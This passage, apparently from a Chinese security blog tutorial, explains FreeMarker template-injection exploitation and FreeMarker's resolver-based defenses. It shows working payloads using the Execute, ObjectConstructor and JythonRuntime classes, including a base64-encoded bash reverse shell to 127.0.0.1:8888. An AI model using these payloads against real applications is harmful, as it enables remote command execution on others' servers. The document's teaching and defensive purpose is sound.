+        <span class="token class-name">Map</span> root <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        root<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">&quot;user&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Big Joe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Map</span> latest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        root<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">&quot;latestProduct&quot;</span><span class="token punctuation">,</span> latest<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        latest<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">&quot;url&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;products/greenmouse.html&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        latest<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;green mouse&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment">/* Get the template (uses cache internally) */</span>
+        <span class="token class-name">Template</span> temp <span class="token operator">=</span> cfg<span class="token punctuation">.</span><span class="token function">getTemplate</span><span class="token punctuation">(</span><span class="token string">&quot;test.ftl&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment">/* Merge data-model with template */</span>
+        <span class="token class-name">Writer</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OutputStreamWriter</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        temp<span class="token punctuation">.</span><span class="token function">process</span><span class="token punctuation">(</span>root<span class="token punctuation">,</span> out<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// Note: Depending on what `out` is, you may need to call `out.close()`.</span>
+        <span class="token comment">// This is usually the case for file output, but not for servlet output.</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>pom.xml</p>
+<pre class="language-"><code class="lang-xml"><span class="token prolog">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">&quot;</span></span>
+         <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">&quot;</span></span>
+         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">&gt;</span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">&gt;</span></span>
+
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.example<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>freemarker_test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.0-SNAPSHOT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
+
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.freemarker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>freemarker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.3.9<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.python<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>jython-standalone<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.7.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">&gt;</span></span>
+</code></pre>
+<p>test.ftl</p>
+<pre class="language-"><code class="lang-java">$<span class="token punctuation">{</span><span class="token string">&quot;freemarker.template.utility.Execute&quot;</span><span class="token operator">?</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">&quot;calc.exe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
+</code></pre>
+<hr>
+<h3 id="&#x4E09;&#x3001;&#x4F7F;&#x7528;&#x5185;&#x7F6E;&#x51FD;&#x6570;&#x6784;&#x9020;&#x547D;&#x4EE4;&#x6267;&#x884C;">&#x4E09;&#x3001;&#x4F7F;&#x7528;&#x5185;&#x7F6E;&#x51FD;&#x6570;&#x6784;&#x9020;&#x547D;&#x4EE4;&#x6267;&#x884C;</h3>
+<p><strong>FreeMarker&#x9AD8;&#x7EA7;&#x5185;&#x7F6E;&#x51FD;&#x6570;</strong></p>
+<p>&#x53C2;&#x8003;&#xFF1A;<a href="https://freemarker.apache.org/docs/ref_builtins_expert.html" target="_blank">https</a><a href="https://freemarker.apache.org/docs/ref_builtins_expert.html" target="_blank">://freemarker.apache.org/docs/ref_builtins_expert.html</a></p>
+<p>&#x5176;&#x4E2D;&#xFF0C; new&#x51FD;&#x6570;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7EE7;&#x627F; freemarker.template.TemplateModel &#x7C7B;&#x7684;&#x53D8;&#x91CF;&#x3002;</p>
+<p><strong>&#x6784;&#x9020;Payload&#x65B9;&#x6CD5;&#x4E00;(&#x9002;&#x7528;&#x4E8E;&#x5404;&#x79CD;&#x7248;&#x672C;&#xFF0C;&#x5982;2.3.9&#x3001;2.3.17&#x3001;2.3.30)</strong></p>
+<p>freemarker.template.utility&#x91CC;&#x9762;&#x6709;&#x4E2A;Execute&#x7C7B;&#xFF0C;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#xFF0C;&#x8FD9;&#x4E2A;&#x7C7B;&#x4F1A;&#x6267;&#x884C;&#x5B83;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x56E0;&#x6B64;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;new&#x51FD;&#x6570;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;Execute&#x7C7B;&#xFF0C;&#x4F20;&#x8F93;&#x6211;&#x4EEC;&#x8981;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4;&#x4F5C;&#x4E3A;&#x53C2;&#x6570;&#xFF0C;&#x4ECE;&#x800C;&#x6784;&#x9020;&#x8FDC;&#x7A0B;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x6F0F;&#x6D1E;&#x3002;</p>
+<p>&#x6784;&#x9020;payload:</p>
+<pre class="language-"><code class="lang-java"><span class="token operator">&lt;</span>#assign value<span class="token operator">=</span><span class="token string">&quot;freemarker.template.utility.Execute&quot;</span><span class="token operator">?</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>$<span class="token punctuation">{</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token string">&quot;curl http://127.0.0.1:8080&quot;</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
+</code></pre>
+<p>&#x53E6;&#x4E00;&#x79CD;&#x65B9;&#x5F0F;&#xFF0C;&#x4E0D;&#x4F7F;&#x7528;&#x6807;&#x7B7E;&#xFF0C;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x5B57;&#x7B26;&#x4E32;&#x5E76;&#x5165;&#x5230;&#x53D8;&#x91CF;&#x4E2D;&#x3002;(&#x5F53;)</p>
+<pre class="language-"><code class="lang-java">$<span class="token punctuation">{</span><span class="token string">&quot;freemarker.template.utility.Execute&quot;</span><span class="token operator">?</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">&quot;bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjEg}|{base64,-d}|{bash,-i}&quot;</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
+</code></pre>
+<p><strong>&#x6784;&#x9020;Payload&#x65B9;&#x6CD5;&#x4E8C;(&#x9002;&#x7528;&#x4E8E;&#x4E2D;&#x9AD8;&#x7248;&#x672C;&#xFF0C;&#x5982;2.3.17&#x3001;2.3.30)</strong></p>
+<p>freemarker.template.utility&#x91CC;&#x9762;&#x6709;&#x4E2A;ObjectConstructor&#x7C7B;&#xFF0C;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#xFF0C;&#x8FD9;&#x4E2A;&#x7C7B;&#x4F1A;&#x628A;&#x5B83;&#x7684;&#x53C2;&#x6570;&#x4F5C;&#x4E3A;&#x540D;&#x79F0;&#xFF0C;&#x6784;&#x9020;&#x4E86;&#x4E00;&#x4E2A;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;&#x3002;&#x56E0;&#x6B64;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x53EF;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x4ECE;&#x800C;&#x6784;&#x9020;&#x8FDC;&#x7A0B;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x6F0F;&#x6D1E;&#x3002;</p>
+<p> &#x6784;&#x9020;payload:</p>
+<pre class="language-"><code class="lang-java"><span class="token operator">&lt;</span>#assign value<span class="token operator">=</span><span class="token string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span><span class="token operator">?</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>$<span class="token punctuation">{</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token string">&quot;java.lang.ProcessBuilder&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;calc.exe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
+</code></pre>
+<pre class="language-"><code class="lang-java">$<span class="token punctuation">{</span><span class="token string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span><span class="token operator">?</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">&quot;java.lang.ProcessBuilder&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;calc.exe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
+</code></pre>
+<p><strong>&#x6784;&#x9020;Payload&#x65B9;&#x6CD5;&#x4E09;(&#x5728;&#x5F15;&#x5165;jython-standalone&#x4F9D;&#x8D56;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x9002;&#x7528;&#x4E8E;&#x5404;&#x79CD;&#x7248;&#x672C;&#xFF0C;&#x5982;2.3.9&#x3001;2.3.17&#x3001;2.3.30)</strong></p>
+<p>freemarker.template.utility&#x91CC;&#x9762;&#x7684;JythonRuntime&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x81EA;&#x5B9A;&#x4E49;&#x6807;&#x7B7E;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x6267;&#x884C;Python&#x547D;&#x4EE4;&#xFF0C;&#x4ECE;&#x800C;&#x6784;&#x9020;&#x8FDC;&#x7A0B;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x6F0F;&#x6D1E;&#x3002;</p>
+<p> &#x6784;&#x9020;payload&#xFF08;&#x4E0D;&#x80FD;&#x4F7F;&#x7528;${}&#x53D8;&#x91CF;&#x5199;&#x6CD5;&#xFF09;:</p>
+<pre class="language-"><code class="lang-java"><span class="token operator">&lt;</span>#assign value<span class="token operator">=</span><span class="token string">&quot;freemarker.template.utility.JythonRuntime&quot;</span><span class="token operator">?</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token annotation punctuation">@value</span><span class="token operator">&gt;</span><span class="token keyword">import</span> <span class="token namespace">os</span><span class="token punctuation">;</span>os<span class="token punctuation">.</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">&quot;calc.exe&quot;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span><span class="token annotation punctuation">@value</span><span class="token operator">&gt;</span>
+</code></pre>
+<p>&#x5B9E;&#x6D4B;&#x5F53;pom&#x62C9;&#x53D6;&#x7684;&#x4F9D;&#x8D56;&#x4E0D;&#x5BF9;&#x65F6;&#xFF0C;jython&#x5BFC;&#x5165;&#x4E0D;&#x4E86;os&#x5E93;&#xFF0C;&#x63A8;&#x6D4B;&#x548C;winodws&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x4E4B;&#x7C7B;&#x7684;&#x6709;&#x5173;&#x3002;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;jython&#x5B9E;&#x9645;&#x53EF;&#x7528;&#x7684;&#x5E93;&#x4F3C;&#x4E4E;&#x53EA;&#x6709;sys&#x3002;&#xFF1A;</p>
+<pre class="language-"><code class="lang-java"><span class="token operator">&lt;</span>#assign value<span class="token operator">=</span><span class="token string">&quot;freemarker.template.utility.JythonRuntime&quot;</span><span class="token operator">?</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token annotation punctuation">@value</span><span class="token operator">&gt;</span><span class="token keyword">import</span> <span class="token namespace">sys</span><span class="token punctuation">;</span>print sys<span class="token punctuation">.</span>version<span class="token punctuation">;</span>print sys<span class="token punctuation">.</span>version_info<span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span><span class="token annotation punctuation">@value</span><span class="token operator">&gt;</span>
+</code></pre>
+<p>&#x9519;&#x8BEF;&#x7684;&#x5F15;&#x5165;&#x5982;&#x4E0B;&#xFF0C;&#x4E3A;&#x975E;&#x72EC;&#x7ACB;&#x7248;&#x672C;&#xFF0C;&#x5728;burp&#x63D2;&#x4EF6;&#x4E2D;&#x4F7F;&#x7528;&#x7684;jython&#x4E5F;&#x5FC5;&#x987B;&#x4E3A;standalone&#x3002;</p>
+<pre class="language-"><code class="lang-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.python<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>jython<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.7.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
+</code></pre>
+<p>&#x6B63;&#x786E;&#x7684;&#x7248;&#x672C;&#x5E94;&#x8BE5;&#x5F15;&#x5165;standalone&#x7248;&#x672C;&#xFF0C;&#x672C;&#x4E8B;&#x5305;&#x542B;&#x4E86;python&#x7684;&#x6807;&#x51C6;&#x5E93;&#xFF08;with the Python standard library (<code>/Lib</code>) files included&#xFF09;&#x3002;</p>
+<pre class="language-"><code class="lang-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.python<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>jython-standalone<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.7.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
+</code></pre>
+<h3 id="&#x56DB;&#x3001;&#x5173;&#x4E8E;&#x5B89;&#x5168;&#x673A;&#x5236;">&#x56DB;&#x3001;&#x5173;&#x4E8E;&#x5B89;&#x5168;&#x673A;&#x5236;</h3>
+<p>&#x5F15;&#x7528;<a href="https://zhuanlan.zhihu.com/p/432361789" target="_blank">&#x5173;&#x4E8E;FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;</a>&#x7684;&#x8BF4;&#x660E;&#xFF0C;&#x53EF;&#x53D1;&#x73B0;</p>
+<blockquote>
+<p><strong>&#x56DB;. FreeMarker&#x5B89;&#x5168;&#x673A;&#x5236;</strong></p>
+<p><strong>&#x4E0A;&#x8FF0;&#x4E09;&#x79CD;&#x5229;&#x7528;&#x65B9;&#x5F0F;&#xFF0C;FreeMarker&#x4E5F;&#x4F5C;&#x51FA;&#x4E86;&#x5B89;&#x5168;&#x63AA;&#x65BD;&#x3002;</strong></p>
+<p>l &#x4ECE;2.3.17&#x7248;&#x672C;&#x5F00;&#x59CB;&#x4F7F;&#x7528;Configuration.setNewBuiltinClassResolver(TemplateClassResolver)&#x6216;&#x8005;new_builtin_class_resolver&#x8BBE;&#x7F6E;&#x6765;&#x9650;&#x5236;&#x5185;&#x7F6E;&#x51FD;&#x6570;new&#x5BF9;&#x7C7B;&#x7684;&#x8BBF;&#x95EE;&#x3002;&#x6B64;&#x5904;&#x5B98;&#x65B9;&#x63D0;&#x4F9B;&#x4E86;&#x4E09;&#x4E2A;&#x9884;&#x5B9A;&#x4E49;&#x7684;&#x89E3;&#x6790;&#x5668;&#xFF1A;</p>
+<p>UNRESTRICTED_RESOLVER&#xFF1A;&#x7B80;&#x5355;&#x5730;&#x8C03;&#x7528;ClassUtil.forName(String)&#x3002;</p>
+<p>SAFER_RESOLVER&#xFF1A;&#x548C;&#x7B2C;&#x4E00;&#x4E2A;&#x7C7B;&#x4F3C;&#xFF0C;&#x4F46;&#x7981;&#x6B62;&#x89E3;&#x6790;ObjectConstructor&#xFF0C;Execute&#x548C;freemarker.template.utility.JythonRuntime&#x3002;</p>
+<p>ALLOWS_NOTHING_RESOLVER&#xFF1A;&#x7981;&#x6B62;&#x89E3;&#x6790;&#x4EFB;&#x4F55;&#x7C7B;&#x3002;</p>
+<p>&#x5F53;&#x7136;&#x7528;&#x6237;&#x81EA;&#x8EAB;&#x4E5F;&#x53EF;&#x4EE5;&#x81EA;&#x5B9A;&#x4E49;&#x89E3;&#x6790;&#x5668;&#x4EE5;&#x62D3;&#x5C55;&#x5BF9;&#x5371;&#x9669;&#x7C7B;&#x7684;&#x9650;&#x5236;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x5B9E;&#x73B0;TemplateClassResolver&#x63A5;&#x53E3;&#x5C31;&#x597D;&#x4E86;&#x3002;</p>
+<p>l api&#x5185;&#x5EFA;&#x51FD;&#x6570;&#x5E76;&#x4E0D;&#x80FD;&#x968F;&#x610F;&#x4F7F;&#x7528;&#xFF0C;&#x5FC5;&#x987B;&#x5728;&#x914D;&#x7F6E;&#x9879;api_builtin_enabled&#x4E3A;true&#x65F6;&#x624D;&#x6709;&#x6548;&#xFF0C;&#x800C;&#x8BE5;&#x914D;&#x7F6E;&#x5728;2.3.22&#x7248;&#x672C;&#x4E4B;&#x540E;&#x9ED8;&#x8BA4;&#x4E3A;false&#x3002;</p>
+<p>l &#x540C;&#x65F6;&#x4E3A;&#x4E86;&#x9632;&#x5FA1;&#x901A;&#x8FC7;&#x5176;&#x4ED6;&#x65B9;&#x5F0F;&#x8C03;&#x7528;&#x6076;&#x610F;&#x65B9;&#x6CD5;&#xFF0C;FreeMarker&#x5185;&#x7F6E;&#x4E86;&#x4E00;&#x4EFD;&#x5371;&#x9669;&#x65B9;&#x6CD5;&#x540D;&#x5355;unsafeMethods.properties[3]&#xFF0C;&#x8BF8;&#x5982;getClassLoader&#x3001;newInstance&#x7B49;&#x5371;&#x9669;&#x65B9;&#x6CD5;&#x90FD;&#x88AB;&#x7981;&#x7528;&#x4E86;&#x3002;</p>
+<p>l &#x5728;Freemarker 2.3.30 &#x4E2D;&#x5F15;&#x5165;&#x4E86;&#x4E00;&#x4E2A;&#x57FA;&#x4E8E;MemberAccessPolicy &#x7684;&#x65B0;&#x6C99;&#x7BB1;&#x3002;&#x9ED8;&#x8BA4;&#x7B56;&#x7565;&#x6539;&#x8FDB;&#x4E86;&#x9ED1;&#x540D;&#x5355;&#x5E76;&#x7981;&#x6B62;&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8BBF;&#x95EE;ClassLoader&#x65B9;&#x6CD5;&#x548C;&#x516C;&#x5171;&#x5B57;&#x6BB5;&#x3002;</p>
+</blockquote>
+<pre class="language-"><code class="lang-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">freemarker<span class="token punctuation">.</span>template<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">freemarker<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">TemplateClassResolver</span><span class="token punctuation">.</span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token comment">/*&#x8981;&#x5F15;&#x5165;&#x5BF9;&#x5E94;&#x7684;&#x5E38;&#x91CF;*/</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> freeMark <span class="token punctuation">{</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
+
+        <span class="token comment">/* ------------------------------------------------------------------------ */</span>
+        <span class="token comment">/* You should do this ONLY ONCE in the whole application life-cycle:        */</span>
+
+        <span class="token comment">/* Create and adjust the configuration singleton */</span>
+        <span class="token class-name">Configuration</span> cfg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Configuration</span><span class="token punctuation">(</span><span class="token comment">/*Configuration.VERSION_2_3_9*/</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        cfg<span class="token punctuation">.</span><span class="token function">setDirectoryForTemplateLoading</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">&quot;E:\\winbak\\tools\\08_Audit\\freemarker_test\\src\\main\\java&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        cfg<span class="token punctuation">.</span><span class="token function">setDefaultEncoding</span><span class="token punctuation">(</span><span class="token string">&quot;UTF-8&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        cfg<span class="token punctuation">.</span><span class="token function">setTemplateExceptionHandler</span><span class="token punctuation">(</span><span class="token class-name">TemplateExceptionHandler</span><span class="token punctuation">.</span><span class="token constant">RETHROW_HANDLER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        cfg<span class="token punctuation">.</span><span class="token function">setNewBuiltinClassResolver</span><span class="token punctuation">(</span><span class="token constant">SAFER_RESOLVER</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*&#x9ED8;&#x8BA4;&#x8BBE;&#x7F6E;&#x662F;UNRESTRICTED_RESOLVER&#xFF0C;&#x5219;&#x767E;&#x65E0;&#x7981;&#x5FCC;*/</span>
+
+        <span class="token comment">/* ------------------------------------------------------------------------ */</span>
+        <span class="token comment">/* You usually do these for MULTIPLE TIMES in the application life-cycle:   */</span>
+        <span class="token comment">//Configuration cfg = new Configuration();</span>
+        <span class="token comment">/* Create a data-model */</span>
+        <span class="token class-name">Map</span> root <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        root<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">&quot;user&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Big Joe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Map</span> latest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        root<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">&quot;latestProduct&quot;</span><span class="token punctuation">,</span> latest<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        latest<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">&quot;url&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;products/greenmouse.html&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        latest<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;green mouse&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment">/* Get the template (uses cache internally) */</span>
+        <span class="token class-name">Template</span> temp <span class="token operator">=</span> cfg<span class="token punctuation">.</span><span class="token function">getTemplate</span><span class="token punctuation">(</span><span class="token string">&quot;test.ftl&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment">/* Merge data-model with template */</span>
+        <span class="token class-name">Writer</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OutputStreamWriter</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        temp<span class="token punctuation">.</span><span class="token function">process</span><span class="token punctuation">(</span>root<span class="token punctuation">,</span> out<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// Note: Depending on what `out` is, you may need to call `out.close()`.</span>
